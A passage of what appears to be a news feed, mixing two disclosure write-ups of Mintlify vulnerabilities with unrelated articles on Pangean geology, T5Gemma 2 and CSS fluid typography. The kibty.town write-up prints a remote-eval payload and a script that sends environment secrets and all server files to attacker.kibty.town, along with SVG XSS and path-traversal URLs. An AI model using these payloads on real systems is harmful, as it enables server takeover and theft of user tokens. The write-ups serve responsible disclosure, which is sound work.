    &lt;p&gt;I found this new update exciting, and as soon as I saw the announcement, I started looking through how they implemented this new documentation platform.&lt;/p&gt;
    &lt;p&gt;Mintlify is an AI-powered documentation platform. You write your documentation as markdown and Mintlify turns it into a beautiful documentation platform with all the modern features a documentation platform needs. (Despite the vulnerabilities we found, I would highly recommend them. They make it really easy to create beautiful docs that work.)&lt;/p&gt;
    &lt;p&gt;Mintlify-hosted documentation sites are on the *.mintlify.app domains, with support for custom domains. In Discord's case, they were just proxying certain routes to their Mintlify documentation at &lt;code&gt;discord.mintlify.app&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Every Mintlify subdomain has a &lt;code&gt;/_mintlify/*&lt;/code&gt; path that is used internally on the platform to power certain features. Regardless of whether it's hosted through the &lt;code&gt;mintlify.app&lt;/code&gt; domain or a custom domain, the &lt;code&gt;/_mintlify&lt;/code&gt; path must be accessible to power the documentation.
&lt;/p&gt;
    &lt;p&gt;(For example, the &lt;code&gt;/api/user&lt;/code&gt; path for authentication: https://docs.x.com/_mintlify/api/user, https://discord.com/_mintlify/api/user, etc)&lt;/p&gt;
    &lt;p&gt;After Discord switched to Mintlify and when I started looking for bugs on the platform, from the get-go, my plan was to find a way to render another Mintlify documentation through Discord's domain.&lt;/p&gt;
    &lt;p&gt;At first, I tried path traversal attacks, but they didn't work. Then, I started looking through the &lt;code&gt;/_mintlify&lt;/code&gt; API endpoints.&lt;/p&gt;
    &lt;p&gt;Using Chrome DevTools to search the assets, I found the endpoint &lt;code&gt;/_mintlify/_markdown/_sites/[subdomain]/[...route]&lt;/code&gt;. It accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;) and it returned a file from that specific documentation (&lt;code&gt;[...route]&lt;/code&gt;). The endpoint didn't check to make sure the &lt;code&gt;[subdomain]&lt;/code&gt; matched with the current host, which means you could fetch files from any Mintlify documentation on an host with the &lt;code&gt;/_mintlify/&lt;/code&gt; route.&lt;/p&gt;
    &lt;p&gt;Unfortunately, this endpoint only returned raw markdown text. The markdown wasn't rendered as HTML, meaning it was impossible to run code. I spent the rest of the time trying different ways to bypass this, but nothing worked.&lt;/p&gt;
    &lt;p&gt;Fast forward 2 days to Sunday, November 9, 2025, I went back to hunting.&lt;/p&gt;
    &lt;p&gt;I was confident there was another endpoint, like the markdown one, which could fetch and return cross-site data, but I couldn't find one. I tried searching web assets and some other techniques, but I couldn't find the endpoint I was looking for.&lt;/p&gt;
    &lt;p&gt;Finally, I decided to look through the Mintlify CLI. Mintlify lets you run your documentation site locally via their npm package (@mintlify/cli). I realized that this probably meant the code powering the documentation platform was somewhat public.&lt;/p&gt;
    &lt;p&gt;After digging through the package and downloading tarballs linked in the code, I found myself at exactly what I was looking for.&lt;/p&gt;
    &lt;p&gt;Jackpot!&lt;/p&gt;
    &lt;p&gt;This was a list of application endpoints (compiled by Nextjs), and in the middle, there's the endpoint &lt;code&gt;/_mintlify/static/[subdomain]/[...route]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Like the markdown endpoint, this endpoint accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;). The only difference was this endpoint returned static files from the documentation repo.&lt;/p&gt;
    &lt;p&gt;First, I tried accessing HTML and JavaScript files but it didn't work; I realized there was some sort of whitelist of file extensions. Then, I tried an SVG file, and it worked.&lt;/p&gt;
    &lt;p&gt;If you didn't know, you can embed JavaScript into an SVG file. The script doesn't run unless the file is directly opened (you can't run scripts from (&lt;code&gt;&amp;lt;img src="/image.svg"&amp;gt;&lt;/code&gt;). This is very common knowledge for security researchers.&lt;/p&gt;
    &lt;p&gt;I created an SVG file with an embedded script, uploaded it to my Mintlify documentation, and opened the endpoint through Discord (https://discord.com/_mintlify/_static/hackerone-a00f3c6c/lmao.svg). It worked!&lt;/p&gt;
    &lt;p&gt;XSS attacks are incredibly rare on Discord, so I shared it with a couple friends.&lt;/p&gt;
    &lt;p&gt;I sent a screenshot to xyzeva, only to find out she had also been looking into Mintlify after the Discord switch. She had previously discovered other vulnerabilities on the Mintlify platform, and had found more that she was preparing to disclose (go read her writeup!). I find it funny we had both separately been looking into Mintlify and found very different, but very critical bugs.&lt;/p&gt;
    &lt;p&gt;Another friend joined, and we created a group chat.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerability to Discord and attempted to contact Mintlify through an employee.&lt;/p&gt;
    &lt;p&gt;Discord took this very seriously, and closed off its entire developer documentation for 2 hours while investigating the impact of this vulnerability. Then, they reverted to their old documentation platform and removed all the Mintlify routes. https://discordstatus.com/incidents/by04x5gnnng3&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; Mintlify contacted us directly very shortly after hearing about the vulnerability through Discord. We set up a Slack channel with Mintlify's engineering team and got to work. Personally, this cross-site scripting attack was the only thing I had the time to find; eva and MDL worked with Mintlify's engineering team to quickly remediate this and other vulnerabilities they found on the platform.&lt;/p&gt;
    &lt;p&gt;In total, the cross-site scripting attack affected almost every Mintlify customer. To name a few: X (Twitter), Vercel, Cursor, Discord, and more.&lt;/p&gt;
    &lt;p&gt;These customers host their documentation on their primary domains and were vulnerable to account takeovers with a single malicious link.&lt;/p&gt;
    &lt;p&gt;Fortunately, we responsibly found and disclosed this vulnerability but this is an example of how compromising a single supply chain can lead to a multitude of problems.&lt;/p&gt;
    &lt;p&gt;In total, we collectively recieved ~$11,000 in bounties. Discord paid $4,000 and Mintlify individually gave us bounties for the impact of the bugs we individually found.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46317098</guid><pubDate>Thu, 18 Dec 2025 19:08:48 +0000</pubDate></item><item><title>The Scottish Highlands, the Appalachians, Atlas are the same mountain range</title><link>https://vividmaps.com/central-pangean-mountains/</link><description>&lt;doc fingerprint="edddc0dbd95864a5"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Scottish Highlands, the Appalachians, and the Atlas are the same mountain range, once connected as the Central Pangean Mountains&lt;/head&gt;
    &lt;p&gt;The Central Pangean Mountains were a great mountain chain in the middle part of the supercontinent Pangaea that stretches across the continent from northeast to southwest during the Carboniferous, Permian Triassic periods. The ridge was formed as a consequence of a collision between the supercontinents Laurussia and Gondwana during the formation of Pangaea. It was similar to the present Himalayas at its highest elevation during the beginning of the Permian period.&lt;/p&gt;
    &lt;p&gt;It’s hard to imagine now that once upon a time that the Scottish Highlands, the Appalachians, the Ouachita Mountains, and the Little Atlas of Morocco are the same mountain range, once connected as the Central Pangean Mountains.&lt;/p&gt;
    &lt;p&gt;During the Permian period, the Central Pangean were subjected to significant physical weathering, decreasing the peaks and forming many deep intermontane plains. By the Middle Triassic, the mountain sierras had been considerably reduced in size. By the beginning of the Jurassic period (200 mln years ago), the Pangean chain in Western Europe disappeared to some highland regions separated by deep marine basins.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46317174</guid><pubDate>Thu, 18 Dec 2025 19:15:17 +0000</pubDate></item><item><title>How to hack Discord, Vercel and more with one easy trick</title><link>https://kibty.town/blog/mintlify/</link><description>&lt;doc fingerprint="b461b8d9682777c9"&gt;
  &lt;main&gt;
    &lt;p&gt;this blogpost was a collaboration with two people, their articles are here: hackermon and mdl&lt;/p&gt;
    &lt;p&gt;this started when i was notified that discord switched documentation platforms to mintlify, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.&lt;/p&gt;
    &lt;head rend="h2"&gt;introduction&lt;/head&gt;
    &lt;p&gt;mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.&lt;/p&gt;
    &lt;p&gt;some of their customers would include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;theres also a bunch of ai features and stuff, but thats beyond the point&lt;/p&gt;
    &lt;p&gt;so, i signed up and got to digging.&lt;/p&gt;
    &lt;head rend="h2"&gt;the rce (CVE-2025-67843)&lt;/head&gt;
    &lt;p&gt;mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).&lt;/p&gt;
    &lt;p&gt;this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?&lt;/p&gt;
    &lt;p&gt;well, i tried it with a simple payload to just eval things from a webserver&lt;/p&gt;
    &lt;code&gt;{!!fetch("https://attacker.kibty.town").then((r) =&amp;gt; r.text()).then((c) =&amp;gt; eval(c))}
&lt;/code&gt;
    &lt;p&gt;i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?&lt;/p&gt;
    &lt;p&gt;i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:&lt;/p&gt;
    &lt;code&gt;const exfil = (data) =&amp;gt;
  fetch("https://attacker.kibty.town", {
    method: "POST",
    body: JSON.stringify(data),
  });
exfil({ files: [{ name: ".env.json", content: JSON.stringify(process.env) }] });
try {
  import("fs").then(async (a) =&amp;gt; {
    const arr = [];
    for (const filename of a.readdirSync(".", { recursive: true })) {
      if (a.lstatSync(filename).isDirectory()) continue;
      const content = a.readFileSync(filename, "utf-8");
      arr.push({ name: filename, content });
    }
    console.log(arr.length);
    await exfil({ files: arr });
    console.log("done exfiling");
  });
} catch (error) {
  exfil(error);
}
&lt;/code&gt;
    &lt;p&gt;and, after running it, this is what i got:&lt;/p&gt;
    &lt;p&gt;shit. this is bad, we have full access.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.&lt;/p&gt;
    &lt;p&gt;alongside, we can poison the nextjs cache for everyone for any site, allowing mass xss, defacing, etc on any docs site.&lt;/p&gt;
    &lt;p&gt;we can also pretend nonexistent pages exist in the cache, allowing targeted xss too&lt;/p&gt;
    &lt;p&gt;with the other keys we could also:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;poisoned mintlifys analytics&lt;/item&gt;
      &lt;item&gt;ruined mintlifys feature flagging&lt;/item&gt;
      &lt;item&gt;dos'ed customer sites via path validations&lt;/item&gt;
      &lt;item&gt;trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;so:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;mass xss (on customer domains)&lt;/item&gt;
      &lt;item&gt;targeted xss (on custom domains)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;very bad.&lt;/p&gt;
    &lt;head rend="h2"&gt;targeted xss (CVE-2025-67842)&lt;/head&gt;
    &lt;p&gt;after getting all of the server routes, i noticed a interesting one: &lt;code&gt;/_mintlify/static/[subdomain]/{...path}&lt;/code&gt;. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.&lt;/p&gt;
    &lt;p&gt;what if i could access my organizations asset from another domain?&lt;/p&gt;
    &lt;p&gt;well i tried, i crafted a url that looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/evascoolcompany/xss.svg
&lt;/code&gt;
    &lt;p&gt;which, the svg on my repository having this content:&lt;/p&gt;
    &lt;code&gt;&amp;lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin);"/&amp;gt;
&lt;/code&gt;
    &lt;p&gt;and when i went to the url, i got this:&lt;/p&gt;
    &lt;p&gt;well, fuck.&lt;/p&gt;
    &lt;head rend="h3"&gt;impact&lt;/head&gt;
    &lt;p&gt;this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as &lt;code&gt;/path&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;the latter was true in discords case, their documentation was on &lt;code&gt;/developers/docs&lt;/code&gt;, and i can just get the &lt;code&gt;token&lt;/code&gt; value from localstorage directly, and exfiltrate it using whatever i want&lt;/p&gt;
    &lt;p&gt;some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more&lt;/p&gt;
    &lt;head rend="h2"&gt;an unexpected message&lt;/head&gt;
    &lt;p&gt;a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, hackermon, who had found the targeted xss independently aswell&lt;/p&gt;
    &lt;p&gt;we started looking into this together, alongside mdl, who was also looking into it with hackermon&lt;/p&gt;
    &lt;p&gt;also checkout their blogposts here and here! (respectively)&lt;/p&gt;
    &lt;p&gt;we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them&lt;/p&gt;
    &lt;head rend="h2"&gt;here comes the patch bypass (CVE-2025-67845)&lt;/head&gt;
    &lt;p&gt;after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea&lt;/p&gt;
    &lt;p&gt;the code for the endpoint looked like this (not exact, recreation):&lt;/p&gt;
    &lt;code&gt;export async function GET(_, { params }) {
  const { subdomain, path: pathParts } = await params;
  const path = "/" + pathParts.join("/");

  const url = `${CDN_BASE_URL}/${subdomain}${path}`;
  const res = await fetch(url);

  if (!res.ok)
    return new NextResponse("Asset not found", {
      status: 404,
    });

  return res; // inaccurate, does more operations but we simply dont care about them here
}
&lt;/code&gt;
    &lt;p&gt;and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path&lt;/p&gt;
    &lt;p&gt;so i crafted a url and tested, it looked like&lt;/p&gt;
    &lt;code&gt;https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
&lt;/code&gt;
    &lt;p&gt;and i was met with the beautiful alert page again&lt;/p&gt;
    &lt;p&gt;always remember to encode your paths properly!&lt;/p&gt;
    &lt;head rend="h2"&gt;non-critical vulnerabilities&lt;/head&gt;
    &lt;p&gt;alongside this, i found a few non-critical vulnerabilties which don't deserve an entire section, so here they are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;github idor (CVE-2025-67844): mintlify doesn't validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path &lt;code&gt;/_mintlify/static/evascoolcompany/xss.svg&lt;/code&gt; or similar with prefixes&lt;/p&gt;
    &lt;head rend="h2"&gt;lets talk impact (again)&lt;/head&gt;
    &lt;p&gt;all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;discord&lt;/item&gt;
      &lt;item&gt;vercel&lt;/item&gt;
      &lt;item&gt;cursor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;...and more, you can view a full list here&lt;/p&gt;
    &lt;p&gt;we could on targeted companies:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;override pages on docs to deface, or xss&lt;/item&gt;
      &lt;item&gt;get 1 click xss&lt;/item&gt;
      &lt;item&gt;view commits or push to repositories&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;the patch&lt;/head&gt;
    &lt;p&gt;after we got in contact with mintlify, everything was patched very swiftly. and i was awarded 5,000 USD for my efforts and findings.&lt;/p&gt;
    &lt;p&gt;the patches for the vulnerabilties were:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client&lt;/item&gt;
      &lt;item&gt;targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization&lt;/item&gt;
      &lt;item&gt;targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren't path traversing the cdn path&lt;/item&gt;
      &lt;item&gt;github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository&lt;/item&gt;
      &lt;item&gt;downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this here&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;make sure to check out hackermon and mdl's reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.&lt;/p&gt;
    &lt;p&gt;card by marshift&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46317546</guid><pubDate>Thu, 18 Dec 2025 19:41:24 +0000</pubDate></item><item><title>T5Gemma 2: The next generation of encoder-decoder models</title><link>https://blog.google/technology/developers/t5gemma-2/</link><description>&lt;doc fingerprint="3fd98798b4f2055e"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;T5Gemma 2: The next generation of encoder-decoder models&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is the next evolution of our encoder-decoder family based on Gemma 3, featuring the first multi-modal and long-context encoder-decoder models.&lt;/p&gt;
    &lt;p&gt;Unlike T5Gemma, T5Gemma 2 adopts tied word embeddings (over encoder and decoder) and merged decoder self- and cross-attention to save model parameters. It offers compact pre-trained models at sizes of 270M-270M (~370M total, excluding vision encoder), 1B-1B (~1.7B) and 4B-4B (~7B) parameters, making them ideal for rapid experimentation and deployment in on-device applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Background&lt;/head&gt;
    &lt;p&gt;With the original T5Gemma, we demonstrated that we could successfully adapt modern, pre-trained decoder-only models into an encoder-decoder architecture, unlocking new versatility. By initializing with weights from a powerful decoder-only model and then applying continued pre-training, we created high-quality, inference-efficient models while bypassing the computational cost of training from scratch.&lt;/p&gt;
    &lt;p&gt;T5Gemma 2 extends this into the realm of vision-language models by incorporating key innovations from Gemma 3.&lt;/p&gt;
    &lt;head rend="h2"&gt;What’s new&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 is more than a re-training. It incorporates significant architectural changes while inheriting many of the powerful, next-generation features of the Gemma 3 family.&lt;/p&gt;
    &lt;head rend="h3"&gt;Architectural innovations for efficiency&lt;/head&gt;
    &lt;p&gt;To maximize efficiency at smaller scales, we have introduced key structural refinements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tied embeddings: We now tie the embeddings between the encoder and decoder. This significantly reduces the overall parameter count, allowing us to pack more active capabilities into the same memory footprint — crucial for our new compact 270M-270M model.&lt;/item&gt;
      &lt;item&gt;Merged attention: In the decoder, we adopt a merged attention mechanism, combining self- and cross-attention into a single, unified attention layer. This reduces model parameters and architectural complexity, improving model parallelization and benefiting inference.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Next-generation capabilities&lt;/head&gt;
    &lt;p&gt;Drawing from Gemma 3, T5Gemma 2 also represents a significant upgrade in model capabilities:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Multimodality: T5Gemma 2 models can understand and process images alongside text. By utilizing a highly efficient vision encoder, the models can seamlessly perform visual question answering and multimodal reasoning tasks.&lt;/item&gt;
      &lt;item&gt;Extended long context: We've dramatically expanded the context window. Leveraging Gemma 3's alternating local and global attention mechanism, T5Gemma 2 can handle context windows of up to 128K tokens.&lt;/item&gt;
      &lt;item&gt;Massively multilingual: Trained on a larger, more diverse dataset, these models now support over 140 languages out of the box.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Performance&lt;/head&gt;
    &lt;p&gt;T5Gemma 2 sets a new standard for what compact encoder-decoder models can achieve. Our new models demonstrate strong performance across key capability areas, inheriting the powerful multimodal and long-context features from the Gemma 3 architecture.&lt;/p&gt;
    &lt;p&gt;Pre-training performance of Gemma 3, T5Gemma and T5Gemma 2 across five unique capabilities.&lt;/p&gt;
    &lt;p&gt;As shown in the charts above, T5Gemma 2 delivers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Strong multimodal performance, outperforming Gemma 3 on several benchmarks. We adapt text-only Gemma 3 base models (270M and 1B) into effective multimodal encoder-decoder models.&lt;/item&gt;
      &lt;item&gt;Superior long-context capability, with substantial quality gains over Gemma 3 and T5Gemma. Using a separate encoder makes T5Gemma 2 better at handling long-context problems.&lt;/item&gt;
      &lt;item&gt;Improved general capabilities. Across coding, reasoning and multilingual tasks, T5Gemma 2 generally surpasses its corresponding Gemma 3 counterpart.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Post-training performance. Note: we are not releasing any post-trained / IT checkpoints. These results here are only for illustration, where we performed a minimal SFT without RL for T5Gemma 2. Also note pre-training and post-training benchmarks are different, so scores are not comparable across plots.&lt;/p&gt;
    &lt;p&gt;Similar to the original T5Gemma, we find that the post-training performance of T5Gemma 2 generally yields better results than its decoder-only counterparts. This makes T5Gemma 2 suitable for both large language model research as well as downstream applications.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;p&gt;We’re looking forward to seeing what the community builds with T5Gemma 2. This release includes pre-trained checkpoints, designed to be post-trained by developers for specific tasks before deployment.&lt;/p&gt;
    &lt;p&gt;These pre-trained checkpoints are available now for broad use across several platforms:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46317657</guid><pubDate>Thu, 18 Dec 2025 19:48:15 +0000</pubDate></item><item><title>Interactive Fluid Typography</title><link>https://electricmagicfactory.com/articles/interactive-fluid-typography/</link><description>&lt;doc fingerprint="b79eb87525a53b09"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Interactive Fluid Typography&lt;/head&gt;
    &lt;p&gt;17th October 2025&lt;/p&gt;
    &lt;p&gt;What we call fluid typography are a set of tricks in CSS that allows to adapt the type size and leading when the screen size changes. So instead of having fixed breakpoints where the font-size abruptly, we want to have a smooth increase between different screen sizes, removing blind spots near the breakpoints where the font was disproportionally big or small.&lt;/p&gt;
    &lt;p&gt; The most basic implementation of fluid typography is to take a base size and a base screen width. If we divide the screen size (&lt;code&gt;100vw&lt;/code&gt;) by the base size, we will have a ratio that will tell us how big is the screen related to the base size. Until recently, we had to take care in order not to multiply or divide two numbers with units, as this created an error. This has been solved in Chrome 140, creating exciting possibilities as outlined in this post by Amit Sheen, but support is still not baseline as I write this lines, so we will then just have to take care using unitless numbers for our base-screen-size and our base-font-size, in order to be able to operate with &lt;code&gt;vw&lt;/code&gt;. This point is important and we'll come back to it later. &lt;/p&gt;
    &lt;code&gt;       --base-screen-size: 1200;
--base-font-size: 16;
--typographic-ratio: 1.618;

.font-size-base {
  calc(
    var(--base-font-size) * (100vw / var(--base-screen-size))
  )
}

.font-size-md {
  calc(
    var(--font-size-base) * var(--typographic-ratio)
  )
}

.font-size-lg {
  calc(
    var(--font-size-md) * var(--typographic-ratio)
  )
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; With this setup, we can have a text-size equal to &lt;code&gt;16px&lt;/code&gt; in our desired base-size that will grow and shrink linearlly with the size of our viewport. This has the obvious drawback that size will grow and shrink indefinetely, making it not very usable as it is. We could restrict that behaviour with &lt;code&gt;@media-queries&lt;/code&gt;, setting it fluid between two breakpoints, and setting it fixed on the rest, but fortunately modern CSS allows to write this in a much more elegant way. &lt;/p&gt;
    &lt;head rend="h2"&gt;Clamp to the rescue&lt;/head&gt;
    &lt;p&gt; With &lt;code&gt;clamp()&lt;/code&gt; function, we can directly set a minimum and maximum size and setting it fluid in between. This method is a good approach, and we could even set different type sizes taking the same value as base and multiplying this value by your favourite typographic ratio—like for example the Golden Ratio (1.618). &lt;/p&gt;
    &lt;code&gt;       --base-screen-size: 1200;

--base-font-size-min: 14;
--base-font-size: 15;
--base-font-size-max: 16;

--typographic-ratio: 1.618;

.font-size-base {
  font-size: clamp(
    calc(1px * var(--base-font-size-min)),
    calc(var(--base-font-size) * 100vw / var(--base-screen-size)),
    calc(1px * var(--base-font-size-max)),
  )
}

--font-size-md {
  font-size: calc(var(--font-size-base) * var(--typographic-ratio))
}

--font-size-lg {
  font-size: calc(var(--font-size-md) * var(--typographic-ratio))
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; However this method has the drawback that for small screens we generally want to set smaller jumps between our different typesizes, so ideally we would set a different typographic ratio. In order to do that we would have to create a &lt;code&gt;breakpoint&lt;/code&gt; where all the types would change abruptly, making that part of the design a little bit junky. Also, it is not very obvious at between which viewport widths is the fluid part going to kick in. &lt;/p&gt;
    &lt;head rend="h2"&gt;Fluid scale generator&lt;/head&gt;
    &lt;p&gt; In order to overcome this, Andy Bell points out in its phenomenal course Complete CSS a way to generate a typographic scale setting different ratios between screen sizes. So for example, we can create a scale for screens up until &lt;code&gt;400px&lt;/code&gt; that will have a &lt;code&gt;1.414&lt;/code&gt; ratio, and then from screens from &lt;code&gt;400px&lt;/code&gt; to &lt;code&gt;1200px&lt;/code&gt; the ratio will increase the bigger the viewport, until a maximum of &lt;code&gt;1.618&lt;/code&gt;. In order to do that, we can use the values generated by Utopia website. As Utopia already generates the fluid values for each of our steps, we just have to generate then and paste them in our code. &lt;/p&gt;
    &lt;code&gt;       --step-0: clamp(0.875rem, 0.8125rem + 0.25vw, 1rem);
/* Step 1: 19.796px → 25.888px */
--step-1: clamp(1.2373rem, 1.0469rem + 0.7615vw, 1.618rem);
/* Step 2: 27.9915px → 41.8868px */
--step-2: clamp(1.7495rem, 1.3152rem + 1.7369vw, 2.6179rem);
/* Step 3: 39.58px → 67.7728px */

.font-size-base {
  font-size: var(--step-0);
}

.font-size-md {
  font-size: var(--step-1);
}

.font-size-lg {
  font-size: var(--step-2);
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt; Now we are in control of everything, we can define the &lt;code&gt;minimum&lt;/code&gt; and &lt;code&gt;maximum&lt;/code&gt; sizes where our fluid typography will work, and we can also define a different scale for small viewports what will steadily grow—or shrink if that is desired—until reaching the scale we set for larger viewports. Also, it allows us to use &lt;code&gt;rem&lt;/code&gt; instead of &lt;code&gt;px&lt;/code&gt;, which should be considered a best practice for accesibility. This makes our typography fit and look harmonious in every screen size. &lt;/p&gt;
    &lt;p&gt;However, there is a price we are paying, we're losing all control in our CSS, and each time we want to change our ratios, add and/or remove different steps or setting different screen limits, we will have to calculate back at Utopia's website and paste it in our code. Also, we lose the ability to try different values in our CSS and see them updated live in our browser.&lt;/p&gt;
    &lt;head rend="h2"&gt;The missing piece: Typed Arithmetic&lt;/head&gt;
    &lt;p&gt; As we introduced before, CSS Typed Arithmetic shipped in Chrome 140, allowing us “to write expressions in CSS such as &lt;code&gt;calc(10em / 1px)&lt;/code&gt; or &lt;code&gt;calc(20% / 0.5em * 1px)&lt;/code&gt;”. This small addition is crucial, as now we can change our unitless typographic ratio based on screen width. Taking as a base the slope formula that Utopia also uses, we will calculate a &lt;code&gt;--screen-normalizer&lt;/code&gt; variable that will allow us to adjust both our &lt;code&gt;font-size&lt;/code&gt; and our &lt;code&gt;typographic-ratio&lt;/code&gt; to the viewport size withing our predefined bounds. &lt;/p&gt;
    &lt;code&gt;       --base-font-size-small: 14px;
--base-font-size-large: 16px;

--lower-ratio: 1.414;
--upper-ratio: 1.618;

--lower-bound: 400px;
--upper-bound: 1200px;

--screen-normalizer: clamp(
  0,
  (100vw - var(--lower-bound)) / (var(--upper-bound) - var(--lower-bound)),
  1
);

--fluid-base-size: calc(
  var(--base-font-size-small) +
  (
    var(--base-font-size-large) -
    var(--base-font-size-small)
  ) *
  var(--screen-normalizer)
);

--fluid-step: calc(
  var(--lower-ratio) +
  (
    var(--upper-ratio) -
    var(--lower-ratio)
  ) *
  var(--screen-normalizer)
);

.font-size-base {
  font-size: var(--fluid-base-size);
}

.font-size-md {
  font-size: calc(var(--font-size-base) * var(--fluid-step))
}

.font-size-lg {
  font-size: calc(var(--font-size-md) * var(--fluid-step))
}
    &lt;/code&gt;
    &lt;p&gt;Font size small&lt;/p&gt;
    &lt;p&gt;Font size medium&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
    &lt;p&gt;Font size large&lt;/p&gt;
    &lt;p&gt;0px * 0 =&lt;/p&gt;
